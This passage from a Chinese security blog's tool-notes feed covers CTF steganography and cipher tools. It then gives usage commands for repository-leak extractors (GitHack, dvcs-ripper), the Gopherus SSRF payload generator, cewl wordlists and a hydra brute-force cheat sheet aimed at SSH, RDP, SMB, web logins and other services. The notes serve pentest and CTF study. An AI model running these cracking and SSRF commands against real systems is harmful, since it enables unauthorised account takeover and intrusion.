href=\"\">silenteye</a> - <em>silenteye</em>是一款可以将文字或者文件隐写隐藏到图片的加密工具。</p>\n<ul>\n<li>Path: </li>\n</ul>\n</li>\n<li>\n<p><a href=\"\">lsb隐写工具</a> - 用于实现 LSB 图像隐写术和基本检测技术</p>\n<ul>\n<li>Path: 工具/1.CTF/图片/cloacked-pixel-master</li>\n<li>使用：\n<code>lsb.py hide &lt;img_file&gt; &lt;payload_file&gt; &lt;password&gt;</code>\n<code>lsb.py extract &lt;stego_file&gt; &lt;out_file&gt; &lt;password&gt;</code>\n<code>lsb.py analyse &lt;stego_file&gt;</code></li>\n</ul>\n</li>\n<li>\n<p><a href=\"\">zsteg</a> - zsteg可以检测PNG和BMP图片里的隐写数据。</p>\n<ul>\n<li>Path:工具/1.CTF/图片/zsteg</li>\n<li>使用: <a href=\"./4.szteg图片隐写检查工具.html\">4.szteg图片隐写检查工具.md</a></li>\n</ul>\n</li>\n</ul>\n<h3 id=\"_6-解密\"> 6.解密</h3>\n<ul>\n<li>凯撒密码\n<ul>\n<li>JPK，可解带密钥与不带密钥</li>\n<li>http://planetcalc.com/1434/</li>\n<li>http://www.qqxiuzi.cn/bianma/ROT5-13-18-47.php</li>\n</ul>\n</li>\n<li>埃特巴什码（Atbash Cipher）\n<ul>\n<li>http://www.practicalcryptography.com/ciphers/classical-era/atbash-cipher/</li>\n</ul>\n</li>\n<li>简单替换密码（Simple Substitution Cipher）\n<ul>\n<li>http://quipqiup.com/</li>\n</ul>\n</li>\n<li>Polybius\n<ul>\n<li>CrypTool</li>\n</ul>\n</li>\n<li>Playfair 密码（Playfair cipher or Playfair square）\n<ul>\n<li>CAP4</li>\n</ul>\n</li>\n<li>Vigenere 维吉尼亚密码\n<ul>\n<li>已知密钥\n<ul>\n<li>Python 的 pycipher 库</li>\n<li><a href=\"http://planetcalc.com/2468/\" target=\"_blank\" rel=\"noopener noreferrer\">在线解密 Vigenère cipher</a></li>\n<li>CAP4</li>\n</ul>\n</li>\n<li>未知密钥\n<ul>\n<li><a href=\"http://www.mygeocachingprofile.com/codebreaker.vigenerecipher.aspx\" target=\"_blank\" rel=\"noopener noreferrer\">Vigenère Cipher Codebreaker</a></li>\n<li><a href=\"https://www.guballa.de/vigenere-solver\" target=\"_blank\" rel=\"noopener noreferrer\">Vigenere Solver</a> ，不够完善。</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>希尔密码（Hill）\n<ul>\n<li>http://www.practicalcryptography.com/ciphers/hill-cipher/</li>\n<li>CAP4</li>\n<li>Cryptool</li>\n</ul>\n</li>\n<li>自动密钥密码（Autokey Cipher）\n<ul>\n<li>已知关键词\n<ul>\n<li>Python 的 pycipher 库</li>\n</ul>\n</li>\n<li>未知关键词\n<ul>\n<li>http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-autokey-cipher/</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>RSA\n<ul>\n<li>分解整数工具\n<ul>\n<li>网站分解，<a href=\"http://factordb.com/\" target=\"_blank\" rel=\"noopener noreferrer\">factor.db</a></li>\n<li>命令行分解，<a href=\"https://github.com/ryosan-470/factordb-pycli\" target=\"_blank\" rel=\"noopener noreferrer\">factordb-pycli</a>，借用 factordb 数据库。</li>\n<li><a href=\"https://sourceforge.net/projects/yafu/\" target=\"_blank\" rel=\"noopener noreferrer\">yafu</a></li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"_0x02-渗透相关工具\"> 0x02 渗透相关工具</h2>\n<h3 id=\"_1-扫描工具\"> 1. 扫描工具</h3>\n<ul>\n<li>\n<p><a href=\"./6.nikto扫描工具.html\">nikto扫描工具.md</a> - web 漏洞扫描工具</p>\n<ul>\n<li><a href=\"./6.nikto扫描工具.html\">6.nikto扫描工具.md</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"7.wpscan\">wpscan</a> - WordPress扫描检测工具</p>\n<ul>\n<li><a href=\"./7.wpscan.html\">7.wpscan.md</a></li>\n</ul>\n</li>\n</ul>\n<h3 id=\"_2-其他\"> 2.其他</h3>\n<ul>\n<li>\n<p><a href=\"./1.版本控制工具文件泄漏.html\">HackGit</a> - git 泄漏利用工具，可还原历史版本，还原后的代码文件在 dist/</p>\n<ul>\n<li>\n<p>path: 工具/0.渗透/web/GitHack-master</p>\n</li>\n<li>\n<p>使用:<code>python GitHack.py http://www.example.com/.git/</code></p>\n</li>\n</ul>\n</li>\n<li>\n<p><a href=\"./1.版本控制工具文件泄漏.html\">dvcs-ripper</a>  - svn/git/Mercurial/Bazaar泄漏利用工具</p>\n<p>path: <a href=\"./1.版本控制工具文件泄漏.html\">1.版本控制工具文件泄漏.md</a></p>\n<p>使用:<code>rip-git.pl -v -u http://www.example.com/.git/</code></p>\n</li>\n<li>\n<p><a href=\"jwt-cracker\">jwt-cracker</a> - JWT暴力破解工具</p>\n<ul>\n<li><a href=\"./9.jwt-cracker.html\">9.jwt-cracker.md</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"hashcat\">hashcat</a> - 密码破解工具</p>\n<ul>\n<li><a href=\"./10.hashcat.html\">10.hashcat.md</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"5.hydra\">hydra</a> - hydra 是一个网络帐号破解工具，支持多种协议</p>\n<ul>\n<li><a href=\"./5.hydra.html\">5.hydra.md</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"./cewl.html\">cewl</a> - 根据网站生成单词字典工具</p>\n<ul>\n<li><a href=\"./12.cewl.html\">12.cewl.md</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"gopherus\">Gopherus</a> - SSRF漏洞gopher协议payload生成工具</p>\n<ul>\n<li><a href=\"./11.gopherus.html\">11.gopherus.md</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"./nc.html\">nc</a> - 一个简单、可靠的网络工具</p>\n<ul>\n<li><a href=\"./8.nc.html\">8.nc.md</a></li>\n</ul>\n</li>\n</ul>\n<h2 id=\"_0x03-逆向工具\"> 0x03 逆向工具</h2>\n<ul>\n<li><a href=\"https://github.com/java-decompiler/jd-gui\" target=\"_blank\" rel=\"noopener noreferrer\">jd-gui</a> - 一个独立的图形工具，逆向显示CLASS文中的Java源代码\n<ul>\n<li>path: \\工具\\3.re\\java逆向工具-jd-gui-windows-1.6.6</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"_0x0a-其他工具\"> 0x0a 其他工具</h2>\n<ul>\n<li><a href=\"\">数独解题器</a> - windows离线数独解题器\n<ul>\n<li>Path: 工具/10.其他工具/shudu.zip</li>\n</ul>\n</li>\n<li><a href=\"\">syslog发包工具</a> - syslog发包工具\n<ul>\n<li>Path: 工具/10.其他工具/syslog发包工具</li>\n</ul>\n</li>\n<li><a href=\"\">二维码扫描工具</a>\n<ul>\n<li>Path：工具/10.其他工具/二维码生成器解码器.exe</li>\n</ul>\n</li>\n</ul>\n",
      "date_published": "2022-04-19T00:00:00.000Z",
      "date_modified": "2022-04-21T09:08:06.000Z",
      "authors": [
        {
          "name": "lhz"
        }
      ],
      "tags": [
        "安全工具"
      ]
    },
    {
      "title": "版本控制文件泄露利用工具",
      "url": "http://www.liuhanzhe.com/docs/security/tools/1.%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6%E5%B7%A5%E5%85%B7%E6%96%87%E4%BB%B6%E6%B3%84%E6%BC%8F/",
      "id": "http://www.liuhanzhe.com/docs/security/tools/1.%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6%E5%B7%A5%E5%85%B7%E6%96%87%E4%BB%B6%E6%B3%84%E6%BC%8F/",
      "content_html": "<h2 id=\"git利用工具\"> .git利用工具</h2>\n<p>git 泄漏利用工具，可还原历史版本，还原后的代码文件在 dist/ 目录下</p>\n<div><p>下载</p>\n<p><a href=\"https://github.com/BugScanTeam/GitHack\" target=\"_blank\" rel=\"noopener noreferrer\">HackGit</a></p>\n</div>\n<div><pre><code>python GitHack.py http://www.example.com/.git/\n</code></pre>\n<div><span>1</span><br></div></div><h2 id=\"svn-git-mercurial-bazaar利用工具\"> svn/git/Mercurial/Bazaar利用工具</h2>\n<div><p>下载</p>\n<p><a href=\"https://github.com/kost/dvcs-ripper\" target=\"_blank\" rel=\"noopener noreferrer\">dvcs-ripper</a></p>\n</div>\n<div><pre><code>rip-git.pl -v -u http://www.example.com/.git/\nrip-hg.pl -v -u http://www.example.com/.hg/\nrip-bzr.pl -v -u http://www.example.com/.bzr/\nrip-svn.pl -v -u http://www.example.com/.svn/\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br></div></div><div><pre><code>隐藏文件名：\ngit: .git  \nsvn: .svn\nBazaar: .Bzr  \nMercurial: .hg\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></div></div>",
      "date_published": "2018-10-01T00:00:00.000Z",
      "date_modified": "2022-04-20T06:36:02.000Z",
      "authors": [
        {
          "name": "lhz"
        }
      ],
      "tags": [
        "安全工具"
      ]
    },
    {
      "title": "SSRF工具Gopherus",
      "url": "http://www.liuhanzhe.com/docs/security/tools/11.gopherus/",
      "id": "http://www.liuhanzhe.com/docs/security/tools/11.gopherus/",
      "content_html": "<h3 id=\"gopherus\"> Gopherus</h3>\n<p>如果您知道某个地方存在 SSRF 漏洞，那么此工具将帮助您生成 Gopher 负载以利用 SSRF（服务器端请求伪造）并获得 RCE（远程代码执行）。它还可以帮助您在受害服务器上获得反向 shell。</p>\n<div><p>下载</p>\n<p><a href=\"https://github.com/tarunkant/Gopherus\" target=\"_blank\" rel=\"noopener noreferrer\">Gopherus</a></p>\n</div>\n<div><pre><code>此工具可以为以下内容生成有效负载：\n      MySQL (Port-3306)\n      PostgreSQL(Port-5432)\n      FastCGI (Port-9000)\n      Memcached (Port-11211)\n          如果存储的数据被反序列化：\n            * Python\n            * Ruby\n            * PHP\n      Redis (Port-6379)\n      Zabbix (Port-10050)\n      SMTP（端口 25）\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br></div></div><div><pre><code>使用:\n      gopherus --exploit fastcgi\n      gopherus --exploit redis\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div>",
      "date_published": "2018-10-01T00:00:00.000Z",
      "date_modified": "2022-04-20T06:36:02.000Z",
      "authors": [
        {
          "name": "lhz"
        }
      ],
      "tags": [
        "安全工具"
      ]
    },
    {
      "title": "字典生成工具cewl",
      "url": "http://www.liuhanzhe.com/docs/security/tools/12.cewl/",
      "id": "http://www.liuhanzhe.com/docs/security/tools/12.cewl/",
      "content_html": "<h2 id=\"cewl\"> cewl</h2>\n<p>cewl是一个 <a href=\"http://www.codercto.com/category/ruby.html\" target=\"_blank\" rel=\"noopener noreferrer\">ruby</a> 应用，爬行指定url的指定深度。也可以跟一个外部链接，结果会返回一个单词列表，这个列表可以扔到John the ripper工具里进行密码破解。cewl还有一个相关的命令行 <a href=\"http://www.codercto.com/tool.html\" target=\"_blank\" rel=\"noopener noreferrer\">工具</a> 应用FAB，它使用相同的元数据提取技术从已下载的列表中创建作者/创建者列表。</p>\n<p><img src=\"/assets/img/image-20210915143858647.png\" alt=\"image-20210915143858647\" /></p>\n<h3 id=\"默认方法\"> 默认方法</h3>\n<div><pre><code>cewl http://dc-2/\n</code></pre>\n<div><span>1</span><br></div></div><h3 id=\"将字典保存到文件中\"> 将字典保存到文件中</h3>\n<div><pre><code>cewl http://dc-2/ -w dict.txt\n</code></pre>\n<div><span>1</span><br></div></div><h3 id=\"生成指定长度的字典\"> 生成指定长度的字典</h3>\n<div><pre><code>cewl http://dc-2/ -m 9\n</code></pre>\n<div><span>1</span><br></div></div><h3 id=\"从网站获取email地址\"> 从网站获取email地址</h3>\n<div><pre><code>cewl http://dc-2/ -n -e\n</code></pre>\n<div><span>1</span><br></div></div><h3 id=\"计算网站中单词重复的次数\"> 计算网站中单词重复的次数</h3>\n<div><pre><code>cewl http://dc-2/ -c\n</code></pre>\n<div><span>1</span><br></div></div><h3 id=\"增加爬行深度\"> 增加爬行深度</h3>\n<div><pre><code>cewl http://dc-2/ -d 3\n</code></pre>\n<div><span>1</span><br></div></div><h3 id=\"显示调试信息\"> 显示调试信息</h3>\n<div><pre><code>cewl http://dc-2/ -debug\n</code></pre>\n<div><span>1</span><br></div></div><h3 id=\"verbose模式\"> Verbose模式</h3>\n<p>不会生成字典，而是会dump网站信息</p>\n<div><pre><code>cewl http://dc-2/ -v\n</code></pre>\n<div><span>1</span><br></div></div><h3 id=\"生成字母数字字典\"> 生成字母数字字典</h3>\n<div><pre><code>cewl http://dc-2/ --with-numbers\n</code></pre>\n<div><span>1</span><br></div></div>",
      "image": "http://www.liuhanzhe.com/assets/img/image-20210915143858647.png",
      "date_published": "2021-09-15T00:00:00.000Z",
      "date_modified": "2022-04-20T06:36:02.000Z",
      "authors": [
        {
          "name": "lhz"
        }
      ],
      "tags": [
        "安全工具"
      ]
    },
    {
      "title": "图片隐写工具-stepic",
      "url": "http://www.liuhanzhe.com/docs/security/tools/2.%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E5%B7%A5%E5%85%B7-stepic/",
      "id": "http://www.liuhanzhe.com/docs/security/tools/2.%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E5%B7%A5%E5%85%B7-stepic/",
      "content_html": "<p>pip安装上stepic</p>\n<p>图片只能使用BMP或者PNG格式的图片</p>\n<p>测试代码：</p>\n<div><pre><code><span>from</span> stepic <span>import</span> Steganographer\n<span>from</span> PIL <span>import</span> Image\n\n<span>def</span> <span>encode</span><span>(</span><span>)</span><span>:</span>\n    <span>##将文本a隐藏到a.png图片中</span>\n    img <span>=</span> Image<span>.</span><span>open</span><span>(</span><span>'./a.png'</span><span>)</span>\n    s <span>=</span> Steganographer<span>(</span>img<span>)</span>\n\n    d <span>=</span> <span>open</span><span>(</span><span>'./a'</span><span>)</span>\n    c <span>=</span> d<span>.</span>read<span>(</span><span>)</span>\n    d<span>.</span>close<span>(</span><span>)</span>\n\n    img <span>=</span> s<span>.</span>encode<span>(</span>c<span>)</span>\n    <span>#保存为r.png</span>\n    img<span>.</span>save<span>(</span><span>'./r.png'</span><span>)</span>\n\n\n<span>def</span> <span>decode_img</span><span>(</span><span>)</span><span>:</span>\n    <span>##从图片提取出隐藏的文本中的内容</span>\n    img <span>=</span> Image<span>.</span><span>open</span><span>(</span><span>'./r.png'</span><span>)</span>\n    s <span>=</span> Steganographer<span>(</span>img<span>)</span>\n    <span>print</span> s<span>.</span>decode<span>(</span><span>)</span>\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br></div></div><p>封装下以便使用：</p>\n<div><pre><code><span>import</span> stepic\n<span>from</span> PIL <span>import</span> Image\n<span>import</span> sys\n\nuseage <span>=</span> <span>'useage:\\nencode: python hideinfo.py IMG INFO OUTPUT\\ndecode: python hideinfo.py IMG'</span>\n\n<span>def</span> <span>encode_img</span><span>(</span>img<span>,</span> info<span>,</span> output<span>)</span><span>:</span>\n    img <span>=</span> Image<span>.</span><span>open</span><span>(</span>img<span>)</span>\n\n    d <span>=</span> <span>open</span><span>(</span>info<span>)</span>\n    info <span>=</span> d<span>.</span>read<span>(</span><span>)</span>\n    d<span>.</span>close<span>(</span><span>)</span>\n\n    img <span>=</span> stepic<span>.</span>encode<span>(</span>img<span>,</span> info<span>)</span>\n\n    img<span>.</span>save<span>(</span>output<span>)</span>\n\n\n<span>def</span> <span>decode_img</span><span>(</span>img<span>)</span><span>:</span>\n    img <span>=</span> Image<span>.</span><span>open</span><span>(</span>img<span>)</span>\n    <span>print</span> stepic<span>.</span>decode<span>(</span>img<span>)</span>\n\n<span>if</span> <span>len</span><span>(</span>sys<span>.</span>argv<span>)</span> <span>==</span> <span>2</span><span>:</span>\n    decode_img<span>(</span>sys<span>.</span>argv<span>[</span><span>1</span><span>]</span><span>)</span>\n<span>elif</span> <span>len</span><span>(</span>sys<span>.</span>argv<span>)</span> <span>==</span> <span>4</span><span>:</span>\n    encode_img<span>(</span>sys<span>.</span>argv<span>[</span><span>1</span><span>]</span><span>,</span> sys<span>.</span>argv<span>[</span><span>2</span><span>]</span><span>,</span> sys<span>.</span>argv<span>[</span><span>3</span><span>]</span><span>)</span>\n<span>else</span><span>:</span>\n    <span>print</span> useage\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br></div></div>",
      "date_published": "2022-01-24T00:00:00.000Z",
      "date_modified": "2022-04-20T06:36:02.000Z",
      "authors": [
        {
          "name": "lhz"
        }
      ],
      "tags": [
        "安全工具"
      ]
    },
    {
      "title": "图片隐写查看工具-Stegsolve",
      "url": "http://www.liuhanzhe.com/docs/security/tools/3.%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E6%9F%A5%E7%9C%8B%E5%B7%A5%E5%85%B7-Stegsolve/",
      "id": "http://www.liuhanzhe.com/docs/security/tools/3.%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E6%9F%A5%E7%9C%8B%E5%B7%A5%E5%85%B7-Stegsolve/",
      "content_html": "<h2 id=\"stegsolve使用方法\"> Stegsolve使用方法</h2>\n<p>Stegsolve使用方法（是因为ctf题总是遇到并且目前百度没有十分详细的探究说明）</p>\n<p><img src=\"/assets/img/image-20220418191643868.png\" alt=\"image-20220418191643868\" /></p>\n<p>这个没什么好说的，打开文件 ，保存，退出</p>\n<p><img src=\"/assets/img/image-20220418191703150.png\" alt=\"image-20220418191703150\" /></p>\n<p>在分析里面从上到下的依次意思是</p>\n<p>File Format:文件格式</p>\n<p>Data Extract:数据提取</p>\n<p>Steregram Solve:立体试图 可以左右控制偏移</p>\n<p>Frame Browser:帧浏览器</p>\n<p>Image Combiner:拼图，图片拼接</p>\n<p>用法（使用场景）</p>\n<p>1.File Format:这里你会看见图片的具体信息有时候有些图片隐写的flag会藏在这里</p>\n<p>2.Data Extract:(好多涉及到数据提取的时候，很多博主在wp中都是一带而过，小白们还以为要一个个试。。)</p>\n<p><img src=\"/assets/img/image-20220418191729120.png\" alt=\"image-20220418191729120\" /></p>\n<p>左边一大部分主要是讲了RGBA（Alpha是透明度）的颜色通道</p>\n<p>为了方便理解我们分开说</p>\n<p>RGB是红绿蓝 但他们的值代表的实际上是亮度</p>\n<p>R的数字越大，则代表红色亮度越高；R的数字越小，则代表红色亮度越低。G，B同理</p>\n<p>R的亮度各有256个级别，GB同理。即从0到255，合计为256个。从数字0到255的逐渐增高，我们人眼观察到的就是亮度越来越大，红色、绿色或蓝色越来越亮。然而256是2的8次方 所以你会看见上图的7~0 一共8个通道</p>\n<p>而Alpha就是透明度 该通道用256级灰度来记录图像中的透明度信息，定义透明、不透明和半透明区域</p>\n<p>alpha的值为0就是全透明，alpha 的值为 255 则表示不透明</p>\n<p>因此左半部分就理解了</p>\n<p>右半部分就是Extra By(额外的)和Bit Order（位顺序）和Bit Plane Order（位平面的顺序）</p>\n<p>1）.Extra By(额外的)：分为row（行）和column（纵）</p>\n<p>每个像素用R，G，B三个分量表示，那么一张图片就像一个矩阵，矩阵的每个单位就是（0<sub>255，0</sub>255，0~255）</p>\n<p>也就会有是纵排列和行排列了，一般事先访问行再访问列（如果相反会引起ve使用方法）</p>\n<p>2）.Bit Order（位顺序）:MSB是一串数据的最高位，LSB是一串数据的最低位。</p>\n<p>3）.Bit Plane Order（位平面的顺序)</p>\n<p>整个图像分解为8个位平面，从LSB(最低有效位0)到MSB（最高有效位7）随着从位平面0 到位平面7，位平面图像的特征逐渐变得复杂，细节不断增加。（一般我们的图片如果是RGB那么就是24位 3乘8嘛）</p>\n<p>4）Bit Plane Order（位平面的顺序）:一般图片是24位 也就是3个8 大家可以想像成三明治 比如BGR就是B为三明治第一层 G为第二层 R为第三层。</p>\n<p>3.Steregram Solve:立体试图 可以左右控制偏移 可以放张图片试一下就知道这个是什么意思了</p>\n<p>4.Frame Browser:帧浏览器  主要是对GIF之类的动图进行分解，把动图一帧帧的放，有时候会是二维码</p>\n<p>5.Image Combiner:拼图，图片拼接（意思显而易见）</p>\n<p>接下来会带大家实战去深入理解一下Data Extract里面ctf经常用到的LSB隐写</p>\n<p><img src=\"/assets/img/image-20220418191742917.png\" alt=\"image-20220418191742917\" /></p>\n<p>这个我们之前介绍的很详细</p>\n<p>而LSB隐写就是修改RGB颜色分量的最低二进制位也就是最低有效位（LSB），而人类的眼睛不会注意到这前后的变化，（人类的眼睛只能识别一部分颜色的变化）</p>\n<p><img src=\"/assets/img/image-20220418191751095.png\" alt=\"image-20220418191751095\" /></p>\n<p>如果我们修改lsb那么颜色依然和没修改的一样，并且修改的话每个像数可以携带3比特的信息。</p>\n<p><img src=\"/assets/img/image-20220418191757120.png\" alt=\"image-20220418191757120\" /></p>\n<p>这个作用是在于把最低位的二进制全部提取出来</p>\n<p><img src=\"/assets/img/image-20220418191803007.png\" alt=\"image-20220418191803007\" /></p>\n<p>这个作用在于对提取出来的最低位使用lsb解码算法</p>\n<p><img src=\"/assets/img/image-20220418191809048.png\" alt=\"image-20220418191809048\" /></p>\n",
      "image": "http://www.liuhanzhe.com/assets/img/image-20220418191643868.png",
      "date_published": "2022-01-24T00:00:00.000Z",
      "date_modified": "2022-04-21T08:19:12.000Z",
      "authors": [
        {
          "name": "lhz"
        }
      ],
      "tags": [
        "安全工具"
      ]
    },
    {
      "title": "图片隐写检查工具-szteg",
      "url": "http://www.liuhanzhe.com/docs/security/tools/4.szteg%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E6%A3%80%E6%9F%A5%E5%B7%A5%E5%85%B7/",
      "id": "http://www.liuhanzhe.com/docs/security/tools/4.szteg%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E6%A3%80%E6%9F%A5%E5%B7%A5%E5%85%B7/",
      "content_html": "<h2 id=\"隐写工具zsteg安装和使用方法\"> <a href=\"https://www.cnblogs.com/pcat/p/12624953.html\" target=\"_blank\" rel=\"noopener noreferrer\">隐写工具zsteg安装和使用方法</a></h2>\n<p>zsteg可以检测PNG和BMP图片里的隐写数据。</p>\n<p>目前，zsteg支持检测：</p>\n<ul>\n<li>LSB steganography in PNG &amp; BMP</li>\n<li>zlib-compressed data</li>\n<li>OpenStego</li>\n<li>Camouflage 1.2.1</li>\n<li>LSB with The Eratosthenes set</li>\n</ul>\n<p>github项目：https://github.com/zed-0xff/zsteg</p>\n<p>作者网站：http://zed.0xff.me/</p>\n<p>-------</p>\n<p><strong>0x01 安装zsteg</strong></p>\n<div><pre><code>git clone https://github.com/zed-0xff/zsteg\ncd zsteg/\ngem install zsteg\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><p>鉴于国内网速，gem install如果一直没反应，更换RubyGems的源。</p>\n<div><pre><code>gem sources --remove https://rubygems.org/\ngem sources --add https://gems.ruby-china.com/\ngem sources -l\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><p><strong>0x02 zsteg的使用方法</strong></p>\n<p>查看帮助</p>\n<div><pre><code>zsteg -h\n</code></pre>\n<div><span>1</span><br></div></div><p>查看LSB信息</p>\n<div><pre><code>zsteg pcat.png\n</code></pre>\n<div><span>1</span><br></div></div><p>检测zlib</p>\n<div><pre><code># -b的位数是从1开始的\nzsteg zlib.bmp -b 1 -o xy -v\n</code></pre>\n<div><span>1</span><br><span>2</span><br></div></div><p>显示细节</p>\n<div><pre><code>zsteg pcat.png -v\n</code></pre>\n<div><span>1</span><br></div></div><p>尝试所有已知的组合</p>\n<div><pre><code>zsteg pcat.png -a\n</code></pre>\n<div><span>1</span><br></div></div><p>导出内容</p>\n<div><pre><code>zsteg -E &quot;b1,bgr,lsb,xy&quot; pcat.png &gt; p.exe\n</code></pre>\n<div><span>1</span><br></div></div><p>其他的请查看README.md</p>\n",
      "date_published": "2022-02-10T00:00:00.000Z",
      "date_modified": "2022-04-21T08:19:12.000Z",
      "authors": [
        {
          "name": "lhz"
        }
      ],
      "tags": [
        "安全工具"
      ]
    },
    {
      "title": "暴力破解工具 hydra",
      "url": "http://www.liuhanzhe.com/docs/security/tools/5.hydra/",
      "id": "http://www.liuhanzhe.com/docs/security/tools/5.hydra/",
      "content_html": "<h2 id=\"hydra\"> hydra</h2>\n<div><pre><code># hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e ns]\n[-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-f] [-s PORT] [-S] [-vV]\nserver service [OPT]\n\n-R\n继续从上一次进度接着破解\n\n-S\n大写，采用SSL链接\n\n-s &lt;PORT&gt;\n小写，可通过这个参数指定非默认端口\n\n-l &lt;LOGIN&gt;\n指定破解的用户，对特定用户破解\n\n-L &lt;FILE&gt;\n指定用户名字典\n\n-p &lt;PASS&gt;\n小写，指定密码破解，少用，一般是采用密码字典\n\n-P &lt;FILE&gt;\n大写，指定密码字典\n\n-e &lt;ns&gt;\n可选选项，n：空密码试探，s：使用指定用户和密码试探\n\n-C &lt;FILE&gt;\n使用冒号分割格式，例如“登录名:密码”来代替-L/-P参数\n\n-M &lt;FILE&gt;\n指定目标列表文件一行一条\n\n-o &lt;FILE&gt;\n指定结果输出文件\n\n-f\n在使用-M参数以后，找到第一对登录名或者密码的时候中止破解\n\n-t &lt;TASKS&gt;\n同时运行的线程数，默认为16\n\n-w &lt;TIME&gt;\n设置最大超时的时间，单位秒，默认是30s\n\n-v / -V\n显示详细过程\n\nserver\n目标ip\n\nservice\n指定服务名，支持的服务和协议：telnet ftp pop3[-ntlm] imap[-ntlm] smb smbnt http[s]-{head|get} http-{get|post}-form http-proxy cisco cisco-enable vnc ldap2 ldap3 mssql mysql oracle-listener postgres nntp socks5 rexec rlogin pcnfs snmp rsh cvs svn icq sapr3 ssh2 smtp-auth[-ntlm] pcanywhere teamspeak sip vmauthd firebird ncp afp等等\n\nOPT\n可选项\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br></div></div><h3 id=\"破解ssh\"> 破解ssh</h3>\n<div><pre><code>hydra -L users.txt -P password.txt -t <span>1</span> -vV -e ns <span>192.168</span>.1.104 <span>ssh</span>\n</code></pre>\n<div><span>1</span><br></div></div><h3 id=\"破解ftp\"> 破解ftp</h3>\n<div><pre><code>hydra <span>ip</span> <span>ftp</span> -l 用户名 -P 密码字典 -e ns -vV\n</code></pre>\n<div><span>1</span><br></div></div><h3 id=\"get方式提交-破解web登录\"> get方式提交，破解web登录</h3>\n<div><pre><code>hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns -f <span>ip</span> http-get /admin/index.php\n</code></pre>\n<div><span>1</span><br></div></div><h3 id=\"破解https\"> 破解https</h3>\n<div><pre><code>hydra -m /index.php -l muts -P pass.txt <span>10.36</span>.16.18 https\n</code></pre>\n<div><span>1</span><br></div></div><h3 id=\"破解teamspeak\"> 破解teamspeak</h3>\n<div><pre><code>hydra -l 用户名 -P 密码字典 -s 端口号 -vV <span>ip</span> teamspeak\n</code></pre>\n<div><span>1</span><br></div></div><h3 id=\"破解cisco\"> 破解cisco</h3>\n<div><pre><code>hydra -P pass.txt <span>10.36</span>.16.18 cisco\nhydra -m cloud -P pass.txt <span>10.36</span>.16.18 cisco-enable\n</code></pre>\n<div><span>1</span><br><span>2</span><br></div></div><h3 id=\"破解smb\"> 破解smb</h3>\n<div><pre><code>hydra -l administrator -P pass.txt <span>10.36</span>.16.18 smb\n</code></pre>\n<div><span>1</span><br></div></div><h3 id=\"破解pop3\"> 破解pop3</h3>\n<div><pre><code>hydra -l muts -P pass.txt my.pop3.mail pop3\n</code></pre>\n<div><span>1</span><br></div></div><h3 id=\"破解rdp\"> 破解rdp</h3>\n<div><pre><code>hydra <span>ip</span> rdp -l administrator -P pass.txt -V\n</code></pre>\n<div><span>1</span><br></div></div><h3 id=\"破解http-proxy\"> 破解http-proxy</h3>\n<div><pre><code>hydra -l admin -P pass.txt http-proxy://10.36.16.18\n</code></pre>\n<div><span>1</span><br></div></div><h3 id=\"破解imap\"> 